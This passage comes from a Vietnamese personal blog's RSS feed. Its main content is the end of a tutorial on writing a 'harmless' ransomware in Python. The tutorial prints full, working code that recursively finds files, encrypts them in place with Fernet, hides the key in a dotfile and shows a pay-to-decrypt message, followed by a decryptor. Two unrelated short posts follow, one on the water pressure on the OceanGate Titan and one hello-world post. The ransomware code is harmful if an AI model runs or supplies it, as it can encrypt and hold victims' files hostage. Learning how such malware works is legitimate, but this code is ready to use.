</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span></code></pre></div><p>Tiếp theo, chúng ta cần tạo key để mã hóa các file chương trình của mình đã tìm được. Key này sẽ được lưu trong <code>.a_deal</code> (mình lưu trong file thế này bởi vì các file có chấm ở đầu tên file sẽ được ẩn trên các hệ thống Unix).</p>
<p>Sau khi chúng ta tạo key thì chúng ta sẽ cần mở các file bằng đường dẫn mình lưu trong <code>files</code>, đọc file và mã hóa nội dung mình đọc được từ file, rồi viết nội dung đã mã hóa vào lại file. Mình đọc và viết ở chế độ nhị phân bởi vì thuật toán Fernet được dùng cho nhị phân.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
</span></span></code></pre></div><p>Thế là xong chương trình mã hóa file (<code>bill-cipher.py</code>). Đây là code cho chương trình mã hóa này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã bị mã hóa! Trả tiền thì sẽ giải mã&#34;</span>)
</span></span></code></pre></div><p>Nếu như mình chạy file <code>bill-cipher.py</code> thì có thể thấy là các file mà chương trình này tìm được sẽ bị mã hóa và trở thành file chứa 1 đống chữ cái, ký tự random.</p>
<p><img src="/img/harmless-ransomware/file1-encrypted.png" alt="file1-encrypted"></p>
<p>Chương trình này cũng có thể mã hóa file ảnh và video nữa.</p>
<p><img src="/img/harmless-ransomware/pic-encrypted.png" alt="pic-encrypted"></p>
<p>Chúng ta biết cách tìm và mã hóa các file trên máy rồi, bây giờ chúng ta cần cách giải mã các file đó.</p>
<hr>
<h2 id="cách-giải-mã">Cách giải mã</h2>
<p>Để giải mã các file bị mã hóa, chúng ta sẽ cần tìm các file đó trước. Thế nên chúng ta sẽ dùng đoạn code tìm file của chương trình mã hóa trên.</p>
<p>Sau khi tìm được file, chúng ta cần đọc key trong <code>.a_deal</code> để giải mã các file bị mã hóa bằng key này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span></code></pre></div><p>Chúng ta sẽ đọc nội dung file ở chế độ nhị phân, giải mã bằng key trong <code>.a_deal</code> và viết nội dung đã giải mã vào lại file đó.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
</span></span></code></pre></div><p>Thế là xong chương trình giải mã file (<code>bill-cipher.py</code>). Đây là code cho chương trình giải mã này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã được giải mã!&#34;</span>)
</span></span></code></pre></div><p>Sau khi chúng ta chạy chương trình này, chúng ta có thể đọc lại nội dung gốc của các file đã bị mã hóa.</p>
<p><img src="/img/harmless-ransomware/file1-decrypted.png" alt="file1-decrypted"></p>
<p>Chúng ta cũng có thể xem lại các file ảnh và video.</p>
<p><img src="/img/harmless-ransomware/pic-decrypted.png" alt="pic-decrypted"></p>
<hr>
<h2 id="kết-luận">Kết luận</h2>
<p>Đó là 2 chương trình mã hóa và giải mã. 2 chương trình đó sẽ kết hợp lại thành 1 con <em>ransomware</em>. Đây chỉ là con ransomware rất đơn giản và vô hại, nếu như nạn nhân có 1 ít kiến thức về mã hóa và giải mã thì họ sẽ không có vấn đề gì trong việc giải mã các file bị mã hóa.</p>
<p>Nhưng lõi của con ransomware cũng giống như lõi của các con ransomware khác: Khả năng <em>tìm</em> và <em>mã hóa</em> các file trên máy tính và khả năng <em>giải mã</em> các file đó.</p>
<p>Đó là cách vận hành của mọi ransomware.</p>
<blockquote>
<p>Bạn có thể đọc mã nguồn của dự án này tại <a href="https://github.com/namberino/simple-ransomware">đây</a></p></blockquote>
]]></content>
        </item>
        
        <item>
            <title>Áp lực nước của tàu OceanGate Titan</title>
            <link>https://namberino.github.io/vi/posts/2024/02/%C3%A1p-l%E1%BB%B1c-n%C6%B0%E1%BB%9Bc-c%E1%BB%A7a-t%C3%A0u-oceangate-titan/</link>
            <pubDate>Mon, 19 Feb 2024 12:27:06 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/02/%C3%A1p-l%E1%BB%B1c-n%C6%B0%E1%BB%9Bc-c%E1%BB%A7a-t%C3%A0u-oceangate-titan/</guid>
            <description>&lt;p&gt;Mình vừa mới tìm hiểu về các thảm họa kĩ thuật kinh khủng nhất trong lịch sử. Thảm họa kĩ thuật mà mình thấy tò mò nhất là &lt;em&gt;thảm họa tàu ngầm OceanGate Titan&lt;/em&gt;. Mình tự hỏi là con tàu đó chịu áp lực cao đến đâu để mà bị nổ tung như vậy. Thế nên mình đã lôi máy tính ra và bắt đầu tính toán.&lt;/p&gt;
&lt;p&gt;Điều nguy hiểm nhất về biển có lẽ là áp suất thủy tĩnh. Áp suất đó tăng với độ sâu từ bề mặt nước đo trở xuống. Càng sâu, áp lực mà biển áp đặt được sẽ tăng dần lên.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Mình vừa mới tìm hiểu về các thảm họa kĩ thuật kinh khủng nhất trong lịch sử. Thảm họa kĩ thuật mà mình thấy tò mò nhất là <em>thảm họa tàu ngầm OceanGate Titan</em>. Mình tự hỏi là con tàu đó chịu áp lực cao đến đâu để mà bị nổ tung như vậy. Thế nên mình đã lôi máy tính ra và bắt đầu tính toán.</p>
<p>Điều nguy hiểm nhất về biển có lẽ là áp suất thủy tĩnh. Áp suất đó tăng với độ sâu từ bề mặt nước đo trở xuống. Càng sâu, áp lực mà biển áp đặt được sẽ tăng dần lên.</p>
<p>Áp suất thủy tĩnh có thể được tính toán bằng công thức sau (giả sử áp lực đc đo trên 1 khối chất lỏng có diện tích bề mặt là <em>$1m^2$</em>):</p>
<p>$$
P = \rho g h
$$</p>
<p><em>$P$</em>: Áp suất của chất lỏng ($N/m^2$)</p>
<p><em>$\rho$</em>: Khối lượng riêng của chất lỏng ($kg/m^3$)</p>
<p><em>$g$</em>: Gia tốc do trọng lực ($9.8 m/s^2$)</p>
<p><em>$h$</em>: Độ sâu của khối chất lỏng</p>

    <img src="/img/oceangate/pressure-vi.png"  alt="pressure diagram"  class="center"  style="padding: 0.1rem"  />


<p>Mình tính áp suất trên bề mặt trước rồi nhân nó với độ sâu của tàu OceanGate Titan.</p>
<p>Có 1 vài biến đã được biết sẵn:</p>
<ul>
<li>Áp suất (<em>$P$</em>) trên bề mặt là $1atm$ = $100,000 N/m^2$</li>
<li>Trọng lượng riêng của nước là $1,000 kg/m^3$</li>
<li><em>$g$</em> là $9.8 m/s^2$ nhưng mà mình làm tròn nó lên $10 m/s^2$</li>
</ul>
<p>Từ đó mình tính ra:</p>
<p>$$
\frac{100,000 N/m^2}{1,000 kg/m^3 \cdot 10 m/s^2} = 10m
$$</p>
<p>Vậy cứ đi sâu $10m$ thì áp suất nước sẽ tăng $1atm$. Và bởi vì tàu OceanGate Titan ở khoảng $4,000m$ khi mà nó nổ, mình tính ra áp suất là:</p>
<p>$$
\frac{4,000m}{10m} = 400atm
$$</p>
<p>Vậy tàu OceanGate Titan phải chịu khoảng áp suất $400atm$. Gấp 400 lần áp suất mà con người thường chịu đựng.</p>
<p>Con số $400atm$ chắc cũng không có ý nghĩa gì nhiều nếu như bạn không rành về vật lý. Thế nên để có thể tưởng tượng đc $400atm$ mạnh đến đâu, đây là 1 video về 1 lon soda nổ tung dưới áp suất <em>$1atm$</em>:</p>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/atsgIvOUFhA?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
    </div>

]]></content>
        </item>
        
        <item>
            <title>Hello World!</title>
            <link>https://namberino.github.io/vi/posts/2024/01/hello-world/</link>
            <pubDate>Sat, 27 Jan 2024 16:11:34 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/01/hello-world/</guid>
            <description>&lt;p&gt;Đây là bài đăng đầu tiên trên website này.&lt;/p&gt;
&lt;p&gt;Những bài đăng tiếp theo sẽ là về nhiều chủ để đa dạng khác nhau, như là khoa học, kĩ thuật và 1 vài cái topic mà mình thấy hay.&lt;/p&gt;
&lt;p&gt;Đây là ảnh 1 con dog cute:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://namberino.github.io/img/hello-world/dogo1.jpg&#34; alt=&#34;Cute dogo&#34;&gt;&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Đây là bài đăng đầu tiên trên website này.</p>
<p>Những bài đăng tiếp theo sẽ là về nhiều chủ để đa dạng khác nhau, như là khoa học, kĩ thuật và 1 vài cái topic mà mình thấy hay.</p>
<p>Đây là ảnh 1 con dog cute:</p>
<p><img src="/img/hello-world/dogo1.jpg" alt="Cute dogo"></p>
]]></content>
        </item>
        
    </channel>
</rss>
